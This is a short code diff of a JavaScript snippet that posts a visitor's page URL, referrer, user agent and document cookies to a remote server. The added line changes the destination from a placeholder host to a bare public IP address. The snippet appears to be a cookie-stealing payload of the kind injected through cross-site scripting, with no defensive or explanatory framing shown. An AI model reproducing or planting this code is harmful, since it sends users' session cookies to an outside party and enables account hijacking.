@@ -36,7 +36,7 @@ if (xmlhttp.readyState==4 && xmlhttp.status==200){
 //alert(xmlhttp.responseText);
 }
 } //http://localhost/git_work/log.php //http://localhost:8088/log.php
-xmlhttp.open("POST","http://www.qwadmin.wer/phpinfo.php",true);
+xmlhttp.open("POST","http://120.79.10.167",true);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send("time="+gettime()+"&url="+geturl()+"&refer="+getrefer()+"&user_agent="+getuser_agent()+"&cookie="+getcookie());
 }
